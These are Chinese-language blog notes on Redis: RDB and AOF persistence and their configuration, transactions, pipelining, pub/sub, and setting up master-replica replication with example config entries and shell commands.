<h5 id="rdb文件名"><a href="#rdb文件名" class="headerlink" title="rdb文件名"></a>rdb文件名</h5><p>默认情况下rdb文件被命名为<code>dump.rdb</code>，但如果服务器有多个Redis服务在运行，建议按照端口号设置文件名。修改radis7.conf配置文件（即安装后设置的配置文件），将<code>dbfilename dump.rdb</code>修改为包含当前Redis服务所在端口的名称，如<code>dbfilename dump6379.rdb</code></p>
<h5 id="自动备份"><a href="#自动备份" class="headerlink" title="自动备份"></a>自动备份</h5><ul>
<li>当达到设置间隔下的修改次数时，如每5秒钟有两次修改，会自动生成dump.rdb文件。</li>
<li>当执行flushall&#x2F;flushdb&#x2F;shutdown命令也会产生dump.rdb文件，但内部是空数据，无法作为备份恢复文件。</li>
</ul>
<p><strong>数据恢复：</strong>将备份文件（dump.rdb）移动到安装目录并重启服务即可。</p>
<p>分机隔离：在实际生产中不可以把drump.rdb和生成redis服务器放在同一台机器，必须分开存储，避免生产机物理损坏后导致备份文件也失效。</p>
<h5 id="手动备份"><a href="#手动备份" class="headerlink" title="手动备份"></a>手动备份</h5><p>Redis提供了两个命令进行手动RDB备份：<code>SAVE</code>和<code>BGSAVE</code>，<strong>生产中只允许使用</strong><code>BGSAVE</code></p>
<ul>
<li><code>SAVE</code>：触发 Redis 的<strong>同步保存</strong>操作，将当前数据库的数据集完整地写入磁盘中的 RDB 文件。在此期间，<strong>Redis 会阻塞所有客户端请求，无法响应外部命令</strong>，直到保存操作完成。</li>
<li><code>BGSAVE</code>：触发 Redis 的<strong>异步保存</strong>操作，创建一个子进程来负责将当前数据库的数据集写入磁盘中的 RDB 文件，而主线程继续处理客户端请求，避免阻塞。</li>
</ul>
<h5 id="其他有关命令"><a href="#其他有关命令" class="headerlink" title="其他有关命令"></a>其他有关命令</h5><p><strong>命令</strong>：<code>LASTSAVE</code></p>
<p><strong>功能</strong>：返回 Redis 上一次成功执行 RDB 持久化（无论是通过 <code>SAVE</code> 还是 <code>BGSAVE</code> 命令触发）的时间，以 Unix 时间戳格式表示。此命令可用于检查数据是否已成功持久化到磁盘。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：返回一个整数，表示上一次成功保存 RDB 文件的 Unix 时间戳。如果从未成功保存过，则返回服务器启动的时间戳。</p>
<h4 id="RDB的优劣"><a href="#RDB的优劣" class="headerlink" title="RDB的优劣"></a>RDB的优劣</h4><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ol>
<li><strong>高性能</strong>：RDB 是基于快照的持久化方式，生成的文件体积小且紧凑，读写效率高。</li>
<li><strong>恢复速度快</strong>：加载 RDB 文件时直接还原数据集，速度比 AOF 快。</li>
<li><strong>备份简单</strong>：RDB 文件是二进制格式，易于传输和存储，适合用于全量备份。</li>
</ol>
<h5 id="劣势"><a href="#劣势" class="headerlink" title="劣势"></a>劣势</h5><ol>
<li><strong>数据丢失风险</strong>：由于快照是周期性生成的，两次快照之间发生故障可能导致部分数据丢失。</li>
<li><strong>不支持增量备份</strong>：每次生成的 RDB 文件都是完整快照，无法只保存变化的部分，可能增加磁盘使用。</li>
<li><strong>可能占用较大内存</strong>：ROB依赖于主进程的fork，在大数据集时，fork会将内存中数据克隆一份，就占用了两倍的原内存，可能导致服务请求的瞬间延迟。</li>
</ol>
<h4 id="RDB文件损坏修复"><a href="#RDB文件损坏修复" class="headerlink" title="RDB文件损坏修复"></a>RDB文件损坏修复</h4><p>在&#x2F;usr&#x2F;bin目录中执行命令:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">redis-check-rdb /path/to/rdbfile</span><br></pre></td></tr></table></figure>



<h4 id="禁用RDB功能"><a href="#禁用RDB功能" class="headerlink" title="禁用RDB功能"></a>禁用RDB功能</h4><p>单次服务运行禁用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli config set save &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>永久禁用：修改配置文件，将被注释的<code>save &quot;&quot;</code>改为不被注释即可。</p>
<h4 id="RDB优化配置项"><a href="#RDB优化配置项" class="headerlink" title="RDB优化配置项"></a>RDB优化配置项</h4><ol>
<li><p><strong><code>stop-writes-on-bgsave-error</code></strong>  </p>
<ul>
<li>当 RDB 持久化过程中发生错误（如磁盘空间不足或文件写入失败）时，是否停止客户端写操作。  </li>
<li>如果设置为 <code>yes</code>，Redis 在 RDB 保存失败后会停止接收写请求，避免数据进一步丢失或不一致。</li>
</ul>
</li>
<li><p><strong><code>rdbcompression</code></strong>  </p>
<ul>
<li>控制是否对 RDB 文件进行压缩。  </li>
<li>如果设置为 <code>yes</code>，RDB 文件将使用 LZF 压缩算法，减少文件大小但可能增加 CPU 开销。</li>
</ul>
</li>
<li><p><strong><code>rdbchecksum</code></strong>  </p>
<ul>
<li>决定是否在 RDB 文件末尾添加校验和（CRC64）。  </li>
<li>如果设置为 <code>yes</code>，Redis 在加载 RDB 文件时会验证校验和以确保文件完整性，但会稍微增加保存和加载时间。</li>
</ul>
</li>
<li><p><strong><code>rdb-del-sync-files</code></strong>  </p>
<ul>
<li>控制在执行 RDB 持久化时是否删除临时同步文件(rdb文件)。  </li>
<li>如果设置为 <code>yes</code>，Redis 在持久化完成后会清理生成的临时文件，节省磁盘空间。</li>
</ul>
</li>
</ol>
<h3 id="AOF-Append-Only-File"><a href="#AOF-Append-Only-File" class="headerlink" title="AOF(Append Only File)"></a>AOF(Append Only File)</h3><p><strong>AOF（Append Only File）</strong> 是 Redis 的一种持久化机制，通过记录服务器接收到的每个写操作命令到日志文件中（只追加不改写），实现数据的持久化。当 Redis 重启时，会重新执行 AOF 文件中的命令以恢复数据。默认情况下属于关闭状态，需要设置配置项开启：<code>appendonly yes</code></p>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ol>
<li><strong>写入命令记录</strong>：每当 Redis 接收到一个写操作（如 <code>SET</code>、<code>LPUSH</code> 等），会将该操作命令以文本形式追加到 AOF 缓冲区中。</li>
<li><strong>同步到磁盘</strong>：根据配置的 <code>appendfsync</code> 策略（<code>always</code>、<code>everysec</code> 或 <code>no</code>），AOF 缓冲区的内容会被定期写入并同步到磁盘。<ul>
<li><code>always</code>：同步写回，每个写命令执行完后立即同步地将日志写回磁盘</li>
<li><code>everysec</code>：<strong>默认！</strong>每秒写回，每个写命令执行完后先把日志写入AOF文件内存缓冲区，每隔1秒把缓冲区内容写入磁盘。</li>
<li><code>no</code>：操作系统控制的写回，每个写命令执行完后先把日志写入AOF文件内存缓冲区，由操作系统决定何时将缓冲区内容写回磁盘。</li>
</ul>
</li>
<li><strong>AOF 重写</strong>：为避免文件过大，Redis 会周期性地执行 AOF 重写操作，生成一个包含当前数据集最小操作集合的新文件，替换旧文件。</li>
</ol>
<h4 id="备份与恢复-1"><a href="#备份与恢复-1" class="headerlink" title="备份与恢复"></a>备份与恢复</h4><p>当同时存在 AOF 和 RDB 备份时，Redis 优先使用 <strong>AOF 文件</strong> 进行数据恢复。原因在于 AOF 提供了更高的数据完整性（因为它记录了所有的写操作命令，数据丢失的可能性更低）。RDB 虽然恢复速度更快，但可能因快照周期导致部分数据丢失。</p>
<h5 id="开启aof支持："><a href="#开启aof支持：" class="headerlink" title="开启aof支持："></a>开启aof支持：</h5><p>修改配置项：<code>appendonly yes</code></p>
<h5 id="写回策略"><a href="#写回策略" class="headerlink" title="写回策略"></a>写回策略</h5><p>使用默认写回策略：<code>appendfsync everysec</code></p>
<h5 id="备份文件位置"><a href="#备份文件位置" class="headerlink" title="备份文件位置"></a>备份文件位置</h5><p>Redis6：没有单独的配置项，使用和RDB一样的位置。</p>
<p>Redis7：在RDB文件所在目录下创建一个目录并将AOF文件存储在此目录中，目录名由配置项：<code>appenddirname &quot;appendonlydir&quot;</code>决定。</p>
<h5 id="备份文件名"><a href="#备份文件名" class="headerlink" title="备份文件名"></a>备份文件名</h5><p>Redis6：仅一个aof文件，受配置项：<code>appendfilename &quot;appendonly.aof&quot;</code>文件控制。</p>
<p>Redis7：在 Redis 7 中，为了优化 AOF（Append Only File）的性能与管理效率，引入了 <strong>Multi-Part AOF</strong> 设计，将 AOF 文件拆分为多个部分。所有 AOF 文件及 manifest 文件被放置在一个单独的目录中，该目录名由 <code>appenddirname</code> 配置项决定。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250212001659.png"></p>
<ol>
<li><strong>BASE AOF 文件</strong>：作为基础 AOF 文件，通常由子进程通过重写操作生成，包含当前数据集的一个完整快照。 <code>BASE AOF</code> 文件最多只有一个，并且其文件名中包含文件序号，以确保每次创建的文件不会与之前的冲突。 </li>
<li><strong>INCR AOF 文件</strong> ：增量 AOF 文件，记录在 <code>BASE AOF</code> 文件生成后发生的新增或修改操作。<code>INCR AOF</code> 文件可能有多个，每个文件记录一段时间内的增量更新。</li>
<li><strong>HISTORY AOF 文件</strong>：历史 AOF 文件，当一次 AOF 重写成功完成后，之前对应的 <code>BASE</code> 和 <code>INCR AOF</code> 文件会被标记为 <code>HISTORY</code>。  主要用于备份和审计目的，Redis 会自动删除这些历史文件以节省存储空间。</li>
<li><strong>Manifest 文件</strong>：清单文件，用于跟踪和管理所有的 AOF 文件。</li>
</ol>
<h5 id="AOF文件错误和修复"><a href="#AOF文件错误和修复" class="headerlink" title="AOF文件错误和修复"></a>AOF文件错误和修复</h5><p><strong>AOF文件写错误：</strong>当写入命令执行过程中记录到AOF文件时出现各种错误导致无法记录完毕，会导致AOF文件出现错误，恢复时将无法恢复。</p>
<p><strong>修复：</strong>在安装目录（&#x2F;usr&#x2F;local&#x2F;bin）下执行命令<code>redis-check-aof --fix AOFfilename</code>进行修复（AOFfilename指的是三个aof文件），一般只需要修复<code>incr</code>文件</p>
<h4 id="优劣"><a href="#优劣" class="headerlink" title="优劣"></a>优劣</h4><h5 id="优势："><a href="#优势：" class="headerlink" title="优势："></a>优势：</h5><ol>
<li><strong>高数据安全性</strong>：AOF 可以将每条写命令追加到文件中，即使发生故障，最多丢失 <code>appendfsync</code> 配置的时间段内的数据（如 1 秒）。</li>
<li><strong>支持增量更新</strong>：只记录新增或修改的数据，适合频繁写入场景。</li>
<li><strong>可修复性</strong>：如果 AOF 文件损坏，可以通过工具修复。</li>
<li><strong>重写机制</strong>：当AOF文件过大时，Redis有自动重写机制，可以缩减文件大小。</li>
<li><strong>错误操作可挽回</strong>：即使过程中错误执行力flushall等命令，也可以在记录新的日志（即执行写操作）之前，通过从AOF文件中删除flushall相关日志的方式，重新启动并利用AOF文件恢复数据。</li>
</ol>
<h5 id="劣势："><a href="#劣势：" class="headerlink" title="劣势："></a>劣势：</h5><ol>
<li><strong>文件体积大</strong>：AOF 文件记录所有写操作命令，文件可能非常大。</li>
<li><strong>恢复速度慢</strong>：加载 AOF 文件时需要逐条执行命令，耗时较长。</li>
<li><strong>性能稍低</strong>：频繁写入日志可能增加 IO 负担，尤其是 <code>appendfsync always</code> 模式下。同时AOF运行效率也慢于RDB，每秒同步效率较好，但不同步效率较差。</li>
</ol>
<h4 id="AOF重写机制"><a href="#AOF重写机制" class="headerlink" title="AOF重写机制"></a>AOF重写机制</h4><p><strong>工作原理</strong></p>
<ul>
<li>AOF 重写不会直接修改现有的 AOF 文件，而是创建一个新的临时文件。</li>
<li>在重写过程中，Redis 遍历当前内存中的数据集，生成一组最小化的命令集合，用于重建相同的数据状态。</li>
<li>新生成的 AOF 文件会替换旧文件，确保文件体积更小且内容更紧凑。</li>
</ul>
<p><strong>执行特点</strong></p>
<ul>
<li>重写过程由后台子进程完成，不会阻塞主线程处理客户端请求。</li>
<li>在重写期间，新的写操作会被追加到旧的 AOF 文件中，并通过缓冲区同步到新文件，确保数据一致性。</li>
</ul>
<h5 id="自动重写"><a href="#自动重写" class="headerlink" title="自动重写"></a>自动重写</h5><p>当<strong>同时满足</strong>配置文件配置的条件时，会自动执行重写机制，条件由以下配置项控制：</p>
<ul>
<li><code>auto-aof-rewrite-percentage</code>：当前AOF文件大小相对上次重写后文件大小的增长率，默认<code>100</code>，即增长一倍</li>
<li><code>auto-aof-rewrite-min-size</code>：AOF文件大小超过此设定值，默认为<code>64mb</code></li>
</ul>
<h5 id="手动重写"><a href="#手动重写" class="headerlink" title="手动重写"></a>手动重写</h5><p>通过执行 <code>BGREWRITEAOF</code> 命令。</p>
<h4 id="AOF配置总结"><a href="#AOF配置总结" class="headerlink" title="AOF配置总结"></a>AOF配置总结</h4><p><img src="D:\workinenglish\typora_image\image-20250212173432790.png" alt="image-20250212173432790"></p>
<h3 id="ROB-AOF持久化"><a href="#ROB-AOF持久化" class="headerlink" title="ROB+AOF持久化"></a>ROB+AOF持久化</h3><p>当同时存在 AOF 和 RDB 备份时，Redis 优先使用 <strong>AOF 文件</strong> 进行数据恢复。原因在于 AOF 提供了更高的数据完整性（因为它记录了所有的写操作命令，数据丢失的可能性更低）。RDB 虽然恢复速度更快，但可能因快照周期导致部分数据丢失。<strong>建议同时开启ROB和AOF</strong></p>
<h4 id="开启方式"><a href="#开启方式" class="headerlink" title="开启方式"></a>开启方式</h4><p>配置项<code>aof-use-rdb-preamble</code>设置为<code>yes</code>。<strong>注意</strong>：这并不自动开启 AOF 或 RDB 功能，仍需单独配置 <code>appendonly</code> 和 <code>save</code> 参数来启用 AOF 和 RDB 持久化。</p>
<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a><strong>工作原理</strong></h4><ul>
<li>在混合持久化模式下，AOF 文件不仅包含增量的写操作命令，还包含一个 RDB 快照文件的二进制内容（作为 AOF 文件的一部分）。</li>
<li>当 Redis 启动时，优先加载 AOF 文件。如果 AOF 文件存在，它会先从 RDB 快照部分快速恢复大部分数据，然后再执行后续的增量写操作命令，完成数据的完全恢复。</li>
</ul>
<h3 id="纯缓存模式"><a href="#纯缓存模式" class="headerlink" title="纯缓存模式"></a>纯缓存模式</h3><p>分别关闭RDB和AOF：</p>
<ul>
<li><code>save &quot;&quot;</code>：禁用rdb情况下仍可以使用save&#x2F;bgsave命令生成rdb文件。</li>
<li><code>appendonly no</code>：禁用aof情况下仍可以使用bgrewriteaof命令生成aof文件</li>
</ul>
<h2 id="四、事务"><a href="#四、事务" class="headerlink" title="四、事务"></a>四、事务</h2><h3 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h3><p>数据库事务：事务是一组操作的集合，这些操作要么全部执行成功要么全部执行失败。</p>
<p>在 Redis 中，事务是指<strong>一次性、按顺序地</strong>执行一组命令。</p>
<h4 id="Redis-事务与数据库事务的异同"><a href="#Redis-事务与数据库事务的异同" class="headerlink" title="Redis 事务与数据库事务的异同"></a>Redis 事务与数据库事务的异同</h4><p><img src="D:\workinenglish\typora_image\image-20250212202045417.png" alt="image-20250212202045417"></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="基本流程："><a href="#基本流程：" class="headerlink" title="基本流程："></a><strong>基本流程</strong>：</h4><p><strong>事务正常执行流程</strong></p>
<ol>
<li>使用 <code>MULTI</code> 命令标记事务的开始。</li>
<li>将多个命令放入队列中（称为“事务队列”）。</li>
<li>执行 <code>EXEC</code> 命令，一次性执行事务队列中的所有命令。</li>
</ol>
<p><strong>放弃事务执行流程：</strong><code>MULTI</code> &#x3D;》多条命令 &#x3D;》<code>DISCARD</code></p>
<p>其他执行规则：</p>
<ul>
<li>在使用<code>EXEC</code>命令执行事务前，如果检查出命令中只要一条命令出现错误（通常是语法错误），全体都不会执行。</li>
<li>如果命令存在的错误没有在事务执行前检查出来而是执行过程中出现，其他命令的执行不受影响。</li>
</ul>
<h4 id="Redis-事务相关命令简述"><a href="#Redis-事务相关命令简述" class="headerlink" title="Redis 事务相关命令简述"></a>Redis 事务相关命令简述</h4><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>功能</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>MULTI</code></td>
<td>标记事务开始，进入事务模式。</td>
</tr>
<tr>
<td><code>EXEC</code></td>
<td>提交并执行事务队列中的所有命令。</td>
</tr>
<tr>
<td><code>DISCARD</code></td>
<td>取消事务，清空事务队列，放弃执行事务中的所有命令。</td>
</tr>
<tr>
<td><code>WATCH key [key...]</code></td>
<td>监视指定的键，确保事务执行前键未被修改，如修改，事务将被打断。</td>
</tr>
<tr>
<td><code>UNWATCH</code></td>
<td>取消对所有键的监视状态。</td>
</tr>
</tbody></table>
<p>这些命令共同构成了 Redis 的事务机制，适用于需要批量操作的场景。</p>
<h4 id="watch监控"><a href="#watch监控" class="headerlink" title="watch监控"></a>watch监控</h4><p>Redis使用watch命令来提供乐观锁定。Redis事务一次性不允许加塞地执行指的是在同一连接中。可能当前连接中有事务在执行，其他连接中有命令修改事务中涉及的数据。watch命令可以在<code>multi</code>命令之前声明监控事务执行过程中（<code>multi</code>-&gt;<code>exec</code>）操作的键，一旦其被其他连接修改，事务立即中断，即<code>EXEC</code>命令将无法执行事务中的命令。</p>
<h2 id="五、管道"><a href="#五、管道" class="headerlink" title="五、管道"></a>五、管道</h2><h3 id="基础介绍-1"><a href="#基础介绍-1" class="headerlink" title="基础介绍"></a>基础介绍</h3><p>Redis是一种基于CS架构以及请求&#x2F;响应协议的TCP服务，一次请求需要经过（客户端发送命令-&gt;命令排队-&gt;命令执行-&gt;返回结果）四步，客户端以阻塞模式通过监听Socket等待服务器返回结果。Redis 管道（Pipeline）是一种优化机制，允许客户端将多个命令一次性发送到服务器，而不需要等待每个命令的单独响应。服务器接收到所有命令后，会依次执行并将结果批量返回给客户端。</p>
<h4 id="管道技术的核心原理"><a href="#管道技术的核心原理" class="headerlink" title="管道技术的核心原理"></a><strong>管道技术的核心原理</strong></h4><ol>
<li><p><strong>减少网络往返次数</strong>：<br>在没有使用管道的情况下，每次发送命令都需要经历一次完整的请求-响应周期（即网络往返）。而使用管道时，客户端可以将多个命令打包成一个批次发送，从而显著减少网络延迟。</p>
</li>
<li><p><strong>批量处理</strong>：<br>服务器接收到管道中的所有命令后，会按顺序逐一执行，并将所有命令的结果以数组形式返回给客户端。</p>
</li>
<li><p><strong>非阻塞特性</strong>：<br>客户端在发送管道命令后，无需等待每个命令的响应即可继续发送其他命令，从而提高了并发性能。</p>
</li>
</ol>
<h4 id="管道与事务的区别"><a href="#管道与事务的区别" class="headerlink" title="管道与事务的区别"></a><strong>管道与事务的区别</strong></h4><table>
<thead>
<tr>
<th><strong>特性</strong></th>
<th><strong>管道</strong></th>
<th><strong>事务</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>功能</strong></td>
<td>提高批量操作的性能，减少网络往返次数。</td>
<td>提供一组命令的原子性执行保障。</td>
</tr>
<tr>
<td><strong>执行顺序</strong></td>
<td>按发送顺序依次执行命令。</td>
<td>按事务队列顺序执行命令，支持 <code>WATCH</code> 监控和回滚机制（部分失败不回滚）。</td>
</tr>
<tr>
<td><strong>响应方式</strong></td>
<td>批量返回所有命令的结果。</td>
<td>提交后返回单个结果数组。</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>高性能批量操作，但不要求严格的数据一致性。</td>
<td>需要保证一组命令要么全部成功，要么全部失败的场景。</td>
</tr>
</tbody></table>
<h4 id="管道技术的局限性"><a href="#管道技术的局限性" class="headerlink" title="管道技术的局限性"></a><strong>管道技术的局限性</strong></h4><ol>
<li><strong>原子性问题</strong>：<br>  管道中的命令是独立执行的，彼此之间没有事务保障。如果需要保证原子性，必须结合 Redis 的事务机制（<code>MULTI</code>&#x2F;<code>EXEC</code>）使用。</li>
<li><strong>内存占用</strong>：<br>  如果管道中包含大量命令或大块数据，可能会导致服务器内存占用增加。</li>
<li><strong>错误处理复杂</strong>：<br>  管道中的命令一旦发送，无法中途停止或取消。如果某个命令出错，后续命令仍会被执行，可能需要额外的逻辑来处理错误</li>
</ol>
<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><ol>
<li>向一个文件中写入redis命令</li>
<li>通过shell命令执行：<code>cat file | redis-cli -a password --pipe</code></li>
</ol>
<h2 id="六、发布订阅【了解】"><a href="#六、发布订阅【了解】" class="headerlink" title="六、发布订阅【了解】"></a>六、发布订阅【了解】</h2><p>Redis 的发布订阅机制通过频道实现消息的分发，适用于实时通知、事件驱动架构等场景。常用命令包括订阅 (<code>SUBSCRIBE</code>&#x2F;<code>PSUBSCRIBE</code>)、发布 (<code>PUBLISH</code>)、取消订阅 (<code>UNSUBSCRIBE</code>&#x2F;<code>PUNSUBSCRIBE</code>) 以及状态查询 (<code>PUBSUB</code>)。</p>
<h3 id="发布订阅机制"><a href="#发布订阅机制" class="headerlink" title="发布订阅机制"></a><strong>发布订阅机制</strong></h3><p>Redis 的发布订阅（Pub&#x2F;Sub）是一种消息通信模式，允许发送者（发布者）将消息发送到指定的频道，而订阅者可以监听这些频道并接收消息。发布订阅机制是解耦生产者和消费者的典型实现，适合用于实时消息推送场景。</p>
<ul>
<li><strong>特点</strong>：<ul>
<li>发布者和订阅者无需直接交互。</li>
<li>消息一旦发布，未订阅的客户端无法接收。</li>
<li>不支持消息持久化，消息仅在发布时有效。</li>
</ul>
</li>
</ul>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h3><ol>
<li><p><strong><code>SUBSCRIBE channel [channel ...]</code></strong>  </p>
<ul>
<li>订阅一个或多个频道，监听来自这些频道的消息。</li>
<li>示例：<code>SUBSCRIBE news sports</code></li>
</ul>
</li>
<li><p><strong><code>PSUBSCRIBE pattern [pattern ...]</code></strong>  </p>
<ul>
<li>订阅符合特定模式的频道（支持通配符 <code>*</code>）。</li>
<li>示例：<code>PSUBSCRIBE news.*</code></li>
</ul>
</li>
<li><p><strong><code>PUBLISH channel message</code></strong>  </p>
<ul>
<li>向指定频道发布消息，所有订阅该频道的客户端会收到消息。</li>
<li>示例：<code>PUBLISH news &quot;Latest news update!&quot;</code></li>
</ul>
</li>
<li><p><strong><code>UNSUBSCRIBE [channel [channel ...]]</code></strong>  </p>
<ul>
<li>取消订阅指定的频道，若不指定频道，则取消所有订阅。</li>
<li>示例：<code>UNSUBSCRIBE news</code></li>
</ul>
</li>
<li><p><strong><code>PUNSUBSCRIBE [pattern [pattern ...]]</code></strong>  </p>
<ul>
<li>取消订阅符合特定模式的频道。</li>
<li>示例：<code>PUNSUBSCRIBE news.*</code></li>
</ul>
</li>
<li><p><strong><code>PUBSUB subcommand [argument [argument ...]]</code></strong>  </p>
<ul>
<li>查询与发布订阅相关的状态信息。</li>
<li>常用子命令：<ul>
<li><code>PUBSUB CHANNELS</code>：列出所有活跃频道。</li>
<li><code>PUBSUB NUMSUB channel [channel ...]</code>：获取指定频道的订阅者数量。</li>
<li><code>PUBSUB NUMPAT</code>：获取模式匹配的订阅者数量</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="七、复制"><a href="#七、复制" class="headerlink" title="七、复制"></a>七、复制</h2><p>Redis 的复制机制是一种用于数据同步的技术，允许一个或多个从节点（Slave）与主节点（Master）保持数据一致性。这种机制广泛应用于高可用性、负载均衡和数据冗余场景。</p>
<p><strong>配从不配主</strong></p>
<p>权限细节     </p>
<ul>
<li>master如果配置了 requirepass 参数，需要密码登录</li>
<li>slave 需要配置 <code>masterauth</code>来设置检验密码，否则的话master会拒绝slave的访问请求</li>
</ul>
<h3 id="原理、流程和缺点"><a href="#原理、流程和缺点" class="headerlink" title="原理、流程和缺点"></a>原理、流程和缺点</h3><h4 id="基本原理和工作流程"><a href="#基本原理和工作流程" class="headerlink" title="基本原理和工作流程"></a><strong>基本原理和工作流程</strong></h4><p>Redis 的复制机制基于主从架构，通过以下步骤实现数据同步：</p>
<ol>
<li><strong>连接建立</strong></li>
</ol>
<ul>
<li>从节点向主节点发送 <code>REPLICAOF</code> 命令（旧版本为 <code>SLAVEOF</code>），请求成为主节点的从节点，同时发送<code>sync</code>同步请求。</li>
<li>主节点接收请求后，将从节点加入其从节点列表。</li>
</ul>
<ol start="2">
<li><strong>全量同步（Full Resynchronization）</strong></li>
</ol>
<ul>
<li>主节点生成一份 RDB 快照文件，并将其发送给从节点。</li>
<li>在生成快照期间，主节点会将新接收到的写命令缓存到内存中。</li>
<li>当快照传输完成后，主节点将缓存的命令发送给从节点，确保数据一致性。</li>
</ul>
<ol start="3">
<li><strong>心跳维持</strong><ul>
<li>主节点每隔一段时间发送PING请求（心跳包），确保从节点连接，默认为吧 10秒（由配置项<code>rep-ping-replica-period</code>控制）</li>
</ul>
</li>
<li><strong>增量同步（Partial Resynchronization）</strong></li>
</ol>
<ul>
<li>主节点维护一个复制积压缓冲区（Replication Backlog），记录最近执行的写命令。</li>
<li>如果从节点断开连接后重新连接，可以通过偏移量（Offset）请求主节点发送缺失的命令，从而避免重新进行全量同步。</li>
</ul>
<ol start="5">
<li><strong>命令传播</strong></li>
</ol>
<ul>
<li>主节点每次执行写操作时，都会将命令发送给所有从节点。</li>
<li>从节点接收到命令后，立即执行以保持与主节点的数据一致。</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>Redis 的主从复制机制虽然提供了高可用性和读写分离的能力，但也存在一些缺陷：</p>
<ol>
<li><p><strong>单点故障风险</strong>  </p>
<ul>
<li>主节点是数据同步的核心，如果<strong>主节点发生故障且没有及时切换到从节点，可能导致整个系统不可用。</strong></li>
</ul>
</li>
<li><p><strong>数据一致性问题</strong>  </p>
<ul>
<li>在异步复制模式下，主节点的数据可能未完全同步到从节点时就发生故障，导致数据丢失或不一致。</li>
<li>即使使用半同步复制，也无法完全避免在网络分区或延迟较高时出现的数据不一致。</li>
</ul>
</li>
<li><p><strong>从节点只读限制</strong>  </p>
<ul>
<li>默认情况下，<strong>从节点是只读的，无法直接处理写请求</strong>，限制了其应用场景。</li>
</ul>
</li>
<li><p><strong>全量同步开销大</strong>  </p>
<ul>
<li>当从节点初次连接或网络中断后重新连接时，可能需要进行全量同步，这会消耗大量带宽和主节点资源。</li>
</ul>
</li>
<li><p><strong>主节点压力增加</strong>  </p>
<ul>
<li>主节点不仅需要处理客户端请求，还<strong>需要将写操作同步给所有从节点，增加了主节点的负载</strong>。</li>
</ul>
</li>
<li><p><strong>网络依赖性强</strong>  </p>
<ul>
<li>主从复制对网络稳定性要求较高，网络延迟或分区可能导致复制滞后或失败</li>
</ul>
</li>
</ol>
<h3 id="主从关系建立"><a href="#主从关系建立" class="headerlink" title="主从关系建立"></a>主从关系建立</h3><h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><p>常用命令如下：</p>
<ul>
<li><code>info replication</code>   查看复制节点的主从关系和配置信息</li>
<li><code>replicaof/slaveof 主库IP 主库端口</code>   replicaof&#x2F;slaveof这两个一样，一般写入进redis.conf配置文件内，在运行期间修改slave节点的信息，如果该数据库已经某个数据库的从数据库，那么会停止和原主数据库的同步关系转而和新的主数据库同步</li>
<li><code>replicaof/slaveof no one </code>     使当前数据库停止与其他数据库的同步，升级为主数据库</li>
</ul>
<h4 id="配置文件配置"><a href="#配置文件配置" class="headerlink" title="配置文件配置"></a>配置文件配置</h4><p>需要确保防火墙通过设置的端口：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=6379/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<p>配从不配主：从基础设置开始配置</p>
<ol>
<li><p>开启<code>daemonize yes</code>：后台运行</p>
</li>
<li><p>注释掉<code>bind 127.0.0.1</code>：</p>
</li>
<li><p><code>protected-mode no</code>：</p>
</li>
<li><p>指定端口</p>
</li>
<li><p>指定当前工作目录<code>dir</code></p>
</li>
<li><p>pid文件位置和名称<code>pidfile</code>：可以不用修改</p>
</li>
<li><p>log文件名称<code>logfile</code></p>
</li>
<li><p><code>requirepass</code>：登录密码</p>
</li>
<li><p>rdb文件名<code>dbfilename</code>：建议非必须</p>
</li>
<li><p>aof文件名<code>appendfilename</code>：非必须</p>
</li>
<li><p>从机指定主机ip和端口<code>replicaof</code>：主机不需要配置此项。</p>
<blockquote>
<p>replicaof 192.168.52.162 6379</p>
</blockquote>
</li>
<li><p>从机访问主机的通行密码<code>masterauth</code>：主机不需要配置此项。</p>
<blockquote>
<p>masterauth “requirepassofmaster”</p>
</blockquote>
</li>
</ol>
<h4 id="命令配置"><a href="#命令配置" class="headerlink" title="命令配置"></a>命令配置</h4><p>配置文件中如果没有使用<code>replicaof</code>固定指定主机，从机在启动后可以使用<code>slaveof 主机ip 主机端口</code>命令指定当次服务的主机，从机重启服务后失效，需要重新指定。</p>
<h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><p>主机启动服务并连接：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-server ./redis6379.conf</span><br><span class="line">redis-cli -a fsy123   # 主机不需要指定端口，默认使用6379</span><br></pre></td></tr></table></figure>

<p>从机启动服务并连接：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-server ./redis6380.conf</span><br><span class="line">redis-cli -a fsy123 -p 6380  # 从机需要指定端口，使用配置文件中port指定的端口</span><br></pre></td></tr></table></figure>

<p>即可成功</p>
<h4 id="主从关系总结"><a href="#主从关系总结" class="headerlink" title="主从关系总结"></a>主从关系总结</h4><ul>
<li>从机不可写入</li>
<li>从机一旦连接到主机，立即同步其先前的数据，然后再跟着主机操作同步。</li>
<li>主机shutdown后从机不会上位成为主机，会持续等待主机归来。</li>
<li>主机shutdown后主从关系保持不变。</li>
<li>从机宕机后，主机继续操作，从机重启后仍能同步。</li>
</ul>
